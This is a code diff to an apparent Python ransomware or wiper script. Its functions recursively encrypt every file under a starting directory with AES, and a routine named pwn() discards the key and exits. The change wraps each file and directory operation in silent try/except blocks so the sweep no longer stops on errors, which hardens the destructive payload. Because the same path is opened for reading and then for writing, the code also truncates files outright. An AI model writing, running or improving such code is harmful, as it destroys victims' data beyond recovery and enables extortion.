@@ -20,20 +20,20 @@ def encrypt(root, filename, key):
     file_size = str(os.path.getsize(file_path)).zfill(16)
     iv = Random.new().read(16)
     encryptor = AES.new(key, AES.MODE_CBC, iv)
-
-    with open(file_path, 'rb') as infile:
-        with open(file_path, 'wb') as outfile:
-            outfile.write(file_size.encode('utf-8'))
-            outfile.write(iv)
-            while True:
-                chunk = infile.read(CS)
-                if len(chunk) == 0:
-                    break
-                elif len(chunk) % 16 != 0:
-                    chunk += b' ' * (16 - (len(chunk) % 16))
-                outfile.write(encryptor.encrypt(chunk))
-    pass
-
+    try:
+        with open(file_path, 'rb') as infile:
+            with open(file_path, 'wb') as outfile:
+                outfile.write(file_size.encode('utf-8'))
+                outfile.write(iv)
+                while True:
+                    chunk = infile.read(CS)
+                    if len(chunk) == 0:
+                        break
+                    elif len(chunk) % 16 != 0:
+                        chunk += b' ' * (16 - (len(chunk) % 16))
+                    outfile.write(encryptor.encrypt(chunk))
+    except:
+        pass
 
 def recurse(directory, key):
     root = next(os.walk(directory))[0]
@@ -41,22 +41,30 @@ def recurse(directory, key):
     files = next(os.walk(directory))[2]
 
     for file in files:
-        encrypt(root, file, key)
-
+        try:
+            encrypt(root, file, key)
+        except:
+            pass
+        
     if len(directories) > 0:
         for directory in directories:
-            subdirectories = next(os.walk(os.path.join(root, directory)))[1]
-            subfiles = next(os.walk(os.path.join(root, directory)))[2]
-            for subfile in subfiles:
-                encrypt(next(os.walk(os.path.join(root, directory)))[0], subfile, key)
-            if len(subdirectories) > 0:
-                for subdirectory in subdirectories:
-                    path = root + '/' + directory + '/' + subdirectory
+            try:
+                subdirectories = next(os.walk(os.path.join(root, directory)))[1]
+                subfiles = next(os.walk(os.path.join(root, directory)))[2]
+                for subfile in subfiles:
                     try:
-                        recurse(directory=path, key=key)
-                    except UnicodeEncodeError:
+                        encrypt(next(os.walk(os.path.join(root, directory)))[0], subfile, key)
+                    except:
                         pass
-
+                if len(subdirectories) > 0:
+                    for subdirectory in subdirectories:
+                        path = root + '/' + directory + '/' + subdirectory
+                        try:
+                            recurse(directory=path, key=key)
+                        except:
+                            pass
+            except:
+                pass
 
 def gen_key(salt):
     os.urandom(16)
@@ -111,7 +119,10 @@ def pwn():
         recurse(directory, key)
     files = next(os.walk(START_DIR))[2]
     for file in files:
-        encrypt(START_DIR, file, key)
+        try:
+            encrypt(START_DIR, file, key)
+        except:
+            pass
     del key
     exit(0)
 
